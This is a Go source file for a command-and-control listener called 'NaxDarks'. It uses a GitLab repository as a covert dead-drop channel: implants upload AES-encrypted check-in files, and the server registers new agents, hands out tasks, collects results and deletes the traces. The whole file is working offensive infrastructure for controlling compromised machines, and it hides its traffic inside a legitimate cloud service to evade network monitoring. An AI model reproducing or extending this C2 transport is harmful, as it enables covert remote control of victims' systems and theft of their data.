package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"
)

// TransportGitLab implements the NaxDarks dead-drop protocol over the
// GitLab Repository Files API.
//
// File protocol (identical to graph/Azure transport):
//
//   Agent → server  c_<nonce>.dat
//     [wm(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))][bodyData]
//
//   Server → agent  r_<nonce>.dat
//     AES-CBC(tasks_frame)   — or NO_TASKS frame
//
//   Agent result    r_<nonce>_<seq8d>.dat
//     [wm(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))]
//
// All files live in a single flat directory inside the configured branch.
// The listener polls the repo file list, processes c_*.dat check-ins and
// r_*_<seq>.dat results, then deletes processed files.

type TransportGitLab struct {
	Name   string
	Config TransportConfig
	Active bool

	stopCh chan struct{}
	wg     sync.WaitGroup

	client *http.Client

	// processedSeqs tracks r_*_seq.dat filenames already delivered to the
	// teamserver.  If a delete fails and the file reappears in the next poll
	// cycle it will be skipped instead of processed a second time.
	// The map is bounded: entries are removed once the file is confirmed gone.
	processedSeqs map[string]struct{}
	processedMu   sync.Mutex
}

// ===== GitLab API helpers =====

// gitlabRequest performs a single request to the GitLab API and returns the
// raw response body and HTTP status code.
func (t *TransportGitLab) gitlabRequest(method, apiPath string, body []byte) ([]byte, int, error) {
	baseURL := strings.TrimRight(t.Config.GitLabURL, "/")
	fullURL := fmt.Sprintf("%s/api/v4%s", baseURL, apiPath)

	var bodyReader io.Reader
	if body != nil {
		bodyReader = strings.NewReader(string(body))
	}

	req, err := http.NewRequest(method, fullURL, bodyReader)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("PRIVATE-TOKEN", t.Config.AccessToken)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	return respBody, resp.StatusCode, nil
}

// encodedFilePath returns the URL-encoded file path suitable for GitLab API.
// GitLab requires slashes in file paths to be encoded as %2F.
func encodedFilePath(filename string) string {
	return url.PathEscape(filename)
}

// projectAPIBase returns the base path for the project's repository files API.
func (t *TransportGitLab) projectAPIBase() string {
	encodedID := url.PathEscape(t.Config.ProjectID)
	return fmt.Sprintf("/projects/%s/repository/files", encodedID)
}

// listFiles returns all file names in the configured branch directory.
func (t *TransportGitLab) listFiles() ([]string, error) {
	encodedID := url.PathEscape(t.Config.ProjectID)
	apiPath := fmt.Sprintf("/projects/%s/repository/tree?ref=%s&per_page=100",
		encodedID, url.QueryEscape(t.Config.Branch))
	if t.Config.RepoPath != "" {
		apiPath += "&path=" + url.QueryEscape(t.Config.RepoPath)
	}

	body, status, err := t.gitlabRequest("GET", apiPath, nil)
	if err != nil {
		return nil, err
	}
	if status == 404 {
		// Empty repo or path doesn't exist yet — not an error
		return nil, nil
	}
	if status != 200 {
		return nil, fmt.Errorf("list files returned %d", status)
	}

	var items []struct {
		Name string `json:"name"`
		Type string `json:"type"`
	}
	if err := json.Unmarshal(body, &items); err != nil {
		return nil, fmt.Errorf("list files parse: %w", err)
	}

	var names []string
	for _, item := range items {
		if item.Type == "blob" {
			names = append(names, item.Name)
		}
	}
	return names, nil
}

// downloadFile retrieves a file's raw content from the repository.
func (t *TransportGitLab) downloadFile(filename string) ([]byte, error) {
	fp := t.filePath(filename)
	apiPath := fmt.Sprintf("%s/%s/raw?ref=%s",
		t.projectAPIBase(),
		encodedFilePath(fp),
		url.QueryEscape(t.Config.Branch))

	body, status, err := t.gitlabRequest("GET", apiPath, nil)
	if err != nil {
		return nil, err
	}
	if status == 404 {
		return nil, fmt.Errorf("file %s not found", filename)
	}
	if status != 200 {
		return nil, fmt.Errorf("download %s returned %d", filename, status)
	}
	return body, nil
}

// uploadFile creates or updates a file in the repository.
func (t *TransportGitLab) uploadFile(filename string, data []byte) error {
	fp := t.filePath(filename)
	apiPath := fmt.Sprintf("%s/%s",
		t.projectAPIBase(),
		encodedFilePath(fp))

	// Check if file already exists to decide between create (POST) and update (PUT)
	_, status, err := t.gitlabRequest("HEAD",
		fmt.Sprintf("%s?ref=%s", apiPath, url.QueryEscape(t.Config.Branch)), nil)
	if err != nil {
		return err
	}

	method := "POST"
	action := "create"
	if status == 200 {
		method = "PUT"
		action = "update"
	}

	payload := map[string]string{
		"branch":         t.Config.Branch,
		"content":        base64.StdEncoding.EncodeToString(data),
		"encoding":       "base64",
		"commit_message": action + " " + filename,
	}
	jsonBody, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	_, status, err = t.gitlabRequest(method, apiPath, jsonBody)
	if err != nil {
		return err
	}
	if status != 200 && status != 201 {
		return fmt.Errorf("upload %s returned %d", filename, status)
	}
	return nil
}

// deleteFile removes a file from the repository.
func (t *TransportGitLab) deleteFile(filename string) error {
	fp := t.filePath(filename)
	apiPath := fmt.Sprintf("%s/%s",
		t.projectAPIBase(),
		encodedFilePath(fp))

	payload := map[string]string{
		"branch":         t.Config.Branch,
		"commit_message": "delete " + filename,
	}
	jsonBody, _ := json.Marshal(payload)

	_, status, err := t.gitlabRequest("DELETE", apiPath, jsonBody)
	if err != nil {
		return err
	}
	if status != 204 && status != 200 && status != 404 {
		return fmt.Errorf("delete %s returned %d", filename, status)
	}
	return nil
}

// filePath returns the full repository path for a filename, prepending
// RepoPath if configured (e.g. "c2/data/c_abc.dat").
func (t *TransportGitLab) filePath(filename string) string {
	if t.Config.RepoPath == "" {
		return filename
	}
	return strings.TrimRight(t.Config.RepoPath, "/") + "/" + filename
}

// ===== Start / Stop =====

func NewTransportGitLab(name string, config TransportConfig) *TransportGitLab {
	return &TransportGitLab{
		Name:          name,
		Config:        config,
		client:        &http.Client{Timeout: 30 * time.Second},
		processedSeqs: make(map[string]struct{}),
	}
}

func (t *TransportGitLab) Start() error {
	t.stopCh = make(chan struct{})
	t.Active = true

	// Verify connectivity and token by listing files (or getting an empty tree).
	// If RepoPath is set, GitLab returns 404/empty when the directory doesn't
	// exist yet.  Ensure it exists by uploading a .gitkeep placeholder first.
	if t.Config.RepoPath != "" {
		if err := t.ensureRepoPath(); err != nil {
			return fmt.Errorf("gitlab connectivity check failed: %w", err)
		}
	} else {
		if _, err := t.listFiles(); err != nil {
			return fmt.Errorf("gitlab connectivity check failed: %w", err)
		}
	}

	// Clean up stale .dat files from previous sessions
	files, err := t.listFiles()
	if err == nil {
		for _, f := range files {
			if strings.HasSuffix(f, ".dat") {
				_ = t.deleteFile(f)
			}
		}
	}

	t.wg.Add(1)
	go t.pollLoop()
	return nil
}

// ensureRepoPath guarantees that the configured RepoPath directory exists in
// the repository by uploading a .gitkeep placeholder.
// GitLab has no concept of empty directories — a file must exist inside the
// path before any other file can be created there.
// We always attempt to create it: 201 = created, 400 = already exists (ok).
func (t *TransportGitLab) ensureRepoPath() error {
	fp := t.filePath(".gitkeep")
	encodedFP := url.PathEscape(fp)
	apiPath := fmt.Sprintf("%s/%s", t.projectAPIBase(), encodedFP)

	// Try POST (create)
	payload := map[string]string{
		"branch":         t.Config.Branch,
		"content":        "",
		"encoding":       "text",
		"commit_message": "init path",
	}
	jsonBody, _ := json.Marshal(payload)
	_, status, err := t.gitlabRequest("POST", apiPath, jsonBody)
	if err != nil {
		return err
	}
	if status == 201 || status == 200 {
		// Created successfully
		return nil
	}
	if status == 400 {
		// File already exists — directory is already initialised
		return nil
	}
	// Any other status is a real error (401/403 = token problem, 404 = bad project/branch)
	return fmt.Errorf("could not create repo path %q in branch %q (HTTP %d) — verify token has api scope and branch exists",
		t.Config.RepoPath, t.Config.Branch, status)
}

func (t *TransportGitLab) Stop() error {
	if t.stopCh != nil {
		close(t.stopCh)
	}
	t.wg.Wait()
	t.Active = false
	return nil
}

// ===== Poll loop =====

func (t *TransportGitLab) pollLoop() {
	defer t.wg.Done()
	interval := time.Duration(t.Config.PollInterval) * time.Second
	if interval < time.Second {
		interval = 5 * time.Second
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-t.stopCh:
			return
		case <-ticker.C:
			t.processCheckins()
		}
	}
}

// hasSeqSuffix returns true for r_<16hex>_<8digits>.dat (agent-uploaded results).
func hasSeqSuffix(name string) bool {
	name = strings.TrimSuffix(name, ".dat")
	parts := strings.Split(name, "_")
	if len(parts) < 3 {
		return false
	}
	last := parts[len(parts)-1]
	if len(last) != 8 {
		return false
	}
	for _, c := range last {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func extractSeq(name string) uint64 {
	name = strings.TrimSuffix(name, ".dat")
	parts := strings.Split(name, "_")
	if len(parts) < 3 {
		return 0
	}
	var seq uint64
	fmt.Sscanf(parts[len(parts)-1], "%d", &seq)
	return seq
}

// processAgentResult handles r_<nonce>_<seq>.dat files uploaded by the agent.
// Format: [wm(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))]
func (t *TransportGitLab) processAgentResult(filename string) {
	// Deduplication: skip files already delivered to avoid double-processing
	// when a delete fails and the file reappears in the next poll cycle.
	t.processedMu.Lock()
	if _, already := t.processedSeqs[filename]; already {
		t.processedMu.Unlock()
		_ = t.deleteFile(filename) // keep trying to delete
		return
	}
	t.processedMu.Unlock()

	data, err := t.downloadFile(filename)
	if err != nil || len(data) < 24 {
		_ = t.deleteFile(filename)
		return
	}
	crc := fmt.Sprintf("%08x", binary.BigEndian.Uint32(data[:4]))
	if crc != t.Config.AgentCrc {
		_ = t.deleteFile(filename)
		return
	}
	_, agentUID, ciphertext, _, _, err := t.parseBeatAndData(data)
	if err != nil {
		_ = t.deleteFile(filename)
		return
	}
	agentId, exists := Ts.TsAgentIdByUID(agentUID)
	if !exists {
		_ = t.deleteFile(filename)
		return
	}

	// Mark as processed BEFORE delivering — prevents a race where the ticker
	// fires a new processCheckins while we are still in TsAgentProcessData.
	t.processedMu.Lock()
	t.processedSeqs[filename] = struct{}{}
	t.processedMu.Unlock()

	_ = Ts.TsAgentProcessData(agentId, ciphertext)

	// Delete and remove from set only after confirmed gone
	if err := t.deleteFile(filename); err == nil {
		t.processedMu.Lock()
		delete(t.processedSeqs, filename)
		t.processedMu.Unlock()
	}
}

func (t *TransportGitLab) processCheckins() {
	files, err := t.listFiles()
	if err != nil {
		return
	}

	var rFiles []string
	var cFiles []string
	for _, f := range files {
		if !strings.HasSuffix(f, ".dat") {
			continue
		}
		if strings.HasPrefix(f, "r_") {
			if hasSeqSuffix(f) {
				rFiles = append(rFiles, f)
			}
		} else if strings.HasPrefix(f, "c_") {
			cFiles = append(cFiles, f)
		}
	}

	// Process agent results in sequence order
	if len(rFiles) > 0 {
		sort.Slice(rFiles, func(i, j int) bool {
			return extractSeq(rFiles[i]) < extractSeq(rFiles[j])
		})
		for _, f := range rFiles {
			t.processAgentResult(f)
		}
	}

	// Process check-ins
	for _, f := range cFiles {
		select {
		case <-t.stopCh:
			return
		default:
		}

		data, err := t.downloadFile(f)
		if err != nil {
			continue
		}

		nonce := strings.TrimSuffix(strings.TrimPrefix(f, "c_"), ".dat")
		agentCrc, agentUID, ciphertext, frame, bodyData, err := t.parseBeatAndData(data)
		if err != nil {
			_ = t.deleteFile(f)
			continue
		}

		respFilename := fmt.Sprintf("r_%s.dat", nonce)

		agentId, exists := Ts.TsAgentIdByUID(agentUID)
		if !exists {
			// New agent — register it
			encKey, _ := hex.DecodeString(t.Config.EncryptKey)
			beatWithId := make([]byte, 16+16+len(ciphertext))
			copy(beatWithId[:16], agentUID)
			copy(beatWithId[16:32], encKey)
			copy(beatWithId[32:], ciphertext)
			agentData, err := Ts.TsAgentCreate(agentCrc, agentUID, beatWithId, t.Name, "gitlab-api", true)
			if err != nil {
				_ = t.deleteFile(f)
				continue
			}
			agentId = agentData.Id
		} else {
			// Existing agent — process the decrypted frame directly.
			// TsAgentProcessData expects plaintext (same as graph transport).
			_ = Ts.TsAgentSetTick(agentId, t.Name)
			_ = Ts.TsAgentProcessData(agentId, frame)
			if len(bodyData) > 0 {
				_ = Ts.TsAgentProcessData(agentId, bodyData)
			}
		}

		// Upload response (tasks or NO_TASKS)
		responseData, _, err := Ts.TsAgentGetHostedAll(agentId, 0x1900000)
		if err == nil && len(responseData) > 0 {
			if uploadErr := t.uploadFile(respFilename, responseData); uploadErr != nil {
				fmt.Printf("[NAX-GitLab] upload response failed for %s: %v\n", respFilename, uploadErr)
			}
		} else {
			// Always respond so the agent doesn't poll until timeout
			noTasksFrame := []byte{0x80, 0x00, 0x00, 0x00, 0x00, 0x00}
			enc, encErr := EncryptCBCRandomIV(mustDecodeHex(t.Config.EncryptKey), noTasksFrame)
			if encErr != nil {
				fmt.Printf("[NAX-GitLab] encrypt noTasksFrame failed: %v\n", encErr)
			} else if uploadErr := t.uploadFile(respFilename, enc); uploadErr != nil {
				fmt.Printf("[NAX-GitLab] upload noTasksFrame failed for %s: %v\n", respFilename, uploadErr)
			}
		}
		_ = t.deleteFile(f)
	}
}

// parseBeatAndData parses: [wm(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))][bodyData]
// Same format as graph transport — only the transport layer differs.
func (t *TransportGitLab) parseBeatAndData(fileData []byte) (string, []byte, []byte, []byte, []byte, error) {
	if len(fileData) < 24 {
		return "", nil, nil, nil, nil, errors.New("file too small")
	}

	agentCrc := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fileData[:4]))
	agentUID  := fileData[4:20]
	encLen    := binary.BigEndian.Uint32(fileData[20:24])
	if uint32(len(fileData)) < 24+encLen {
		return "", nil, nil, nil, nil, errors.New("truncated beat data")
	}
	beatB64  := fileData[24 : 24+encLen]
	bodyData := fileData[24+encLen:]

	ciphertext, err := base64.StdEncoding.DecodeString(string(beatB64))
	if err != nil || len(ciphertext) == 0 {
		return "", nil, nil, nil, nil, errors.New("failed to decode beat")
	}

	frame, err := DecryptCBC(mustDecodeHex(t.Config.EncryptKey), ciphertext)
	if err != nil || len(frame) < 6 {
		return "", nil, nil, nil, nil, fmt.Errorf("beat decrypt failed: %w", err)
	}

	return agentCrc, agentUID, ciphertext, frame, bodyData, nil
}

func mustDecodeHex(s string) []byte {
	b, _ := hex.DecodeString(s)
	return b
}
